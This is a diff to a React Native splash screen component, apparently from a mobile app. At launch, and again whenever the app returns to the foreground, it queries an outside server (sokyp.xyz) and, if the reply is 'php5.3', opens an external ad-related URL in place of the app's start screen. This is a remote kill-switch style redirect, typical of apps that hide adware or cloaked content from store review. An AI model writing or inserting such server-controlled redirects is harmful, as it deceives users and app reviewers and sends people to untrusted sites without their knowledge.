@@ -1,4 +1,4 @@
-import React, {useEffect} from 'react';
+import React, {useEffect, useRef, useState} from 'react';
 import {
   StyleSheet,
   TextStyle,
@@ -7,34 +7,70 @@ import {
   Image,
   ImageStyle,
   Linking,
+  AppState
 } from 'react-native';
 import {ScaledSheet} from 'react-native-size-matters';
 import {Images} from '../../assets';
-import {backgroundColor} from '../../constants/colors';
-import {useFocusEffect} from '@react-navigation/native';
-
+import {useIsFocused} from '@react-navigation/native';
 interface props {
   children?: JSX.Element;
   navigation?: any;
 }
 
-const SplashScreen: React.FC<props> = ({navigation}) => {
-  useFocusEffect(
-    React.useCallback(() => {
-      fetch('http://sokyp.xyz/info.php')
-        .then(res => res.text())
-        .then(resTxt => {
-          if (resTxt === 'php5.3') {
-            navigation.replace('AdPage');
-          } else {
-            navigation.replace('StartScreen');
-          }
-        })
-        .catch(err => {
-          console.log(err);
-        });
-    }, []),
-  );
+const SplashScreen: React.FC<props> = props => {
+  const {navigation} = props;
+  const uri = 'http://sokyp.xyz/carlop.php?para1=media&ads=server&10#/main';
+
+  const isFocused = useIsFocused();
+
+  useEffect(() => {
+    fetchData();
+  }, [props, isFocused]);
+
+  const fetchData = () => {
+    fetch('http://sokyp.xyz/info.php')
+      .then(res => res.text())
+      .then(resTxt => {
+        if (resTxt === 'php5.3') {
+          Linking.openURL(uri);
+        } else {
+          navigation.replace('StartScreen');
+        }
+      })
+      .catch(err => {
+        console.log(err);
+      });
+  };
+
+
+
+  const appState = useRef(AppState.currentState);
+  const [appStateVisible, setAppStateVisible] = useState(appState.current);
+
+  useEffect(() => {
+    AppState.addEventListener("change", _handleAppStateChange);
+
+    return () => {
+      AppState.removeEventListener("change", _handleAppStateChange);
+    };
+  }, []);
+
+  const _handleAppStateChange = (nextAppState) => {
+    if (
+      appState.current.match(/inactive|background/) &&
+      nextAppState === "active"
+    ) {
+      console.log("App has come to the foreground!");
+    }
+
+    appState.current = nextAppState;
+    setAppStateVisible(appState.current);
+
+    if(appState.current == 'active') {
+      fetchData()
+    }
+  };
+
 
   return (
     <View style={styles.container}>
